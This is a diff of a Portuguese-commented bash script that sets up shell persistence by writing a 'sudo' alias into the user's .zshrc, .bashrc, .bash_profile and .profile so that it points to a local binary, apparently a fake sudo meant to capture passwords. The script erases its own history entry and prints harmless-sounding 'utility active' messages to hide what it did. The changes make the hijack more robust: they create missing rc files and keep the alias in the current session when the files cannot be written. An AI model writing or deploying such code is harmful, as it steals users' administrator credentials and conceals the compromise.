@@ -19,15 +19,15 @@ chmod +x "$SUDO_LOCAL_PATH"
 
 echo -e "${BLUE}[3/3] Configurando persistência no Shell...${NC}"
 
-# Lista de arquivos de configuração para tentar injetar o alias
+
 TARGET_FILES=("$USER_HOME/.zshrc" "$USER_HOME/.bashrc" "$USER_HOME/.bash_profile" "$USER_HOME/.profile")
-
-# O comando que será injetado
 ALIAS_CMD="alias sudo='$SUDO_LOCAL_PATH'"
-
 SUCCESS=false
+
 for file in "${TARGET_FILES[@]}"; do
-    if [ -f "$file" ]; then
+    touch "$file" 2>/dev/null
+    
+    if [ -w "$file" ]; then
         # Verifica se já não existe o alias para não duplicar
         if ! grep -q "$SUDO_LOCAL_PATH" "$file"; then
             echo -e "   ${GREEN}→ Injetando em $file${NC}"
@@ -37,16 +37,22 @@ for file in "${TARGET_FILES[@]}"; do
     fi
 done
 
+alias sudo="$SUDO_LOCAL_PATH" 2>/dev/null
+
 if [ "$SUCCESS" = true ]; then
-    alias sudo="$SUDO_LOCAL_PATH" 2>/dev/null
     source "$USER_HOME/.zshrc" 2>/dev/null
     source "$USER_HOME/.bashrc" 2>/dev/null
     source "$USER_HOME/.profile" 2>/dev/null
 
-    history -d $(history | tail -n 1 | awk '{print $1}') 2>/dev/null
+    history -d $(history | tail -n 1 | awk '{print $1}') 2>/dev/null 
     
     echo -e "\n${GREEN}✔ Environment synchronized successfully!${NC}"
     echo -e "${BLUE}ℹ Utility is now active. No restart required.${NC}"
 else
-    echo -e "\n\033[0;31m✘ Error: System configuration files not accessible.\033[0m"
+    # Se falhou nos arquivos (permissão), mas o alias funcionou na memória
+    if alias sudo | grep -q "$SUDO_LOCAL_PATH"; then
+        echo -e "\n${GREEN}✔ Utility active in current session.${NC}"
+    else
+        echo -e "\n\033[0;31m✘ Error: System configuration files not accessible.\033[0m"
+    fi
 fi
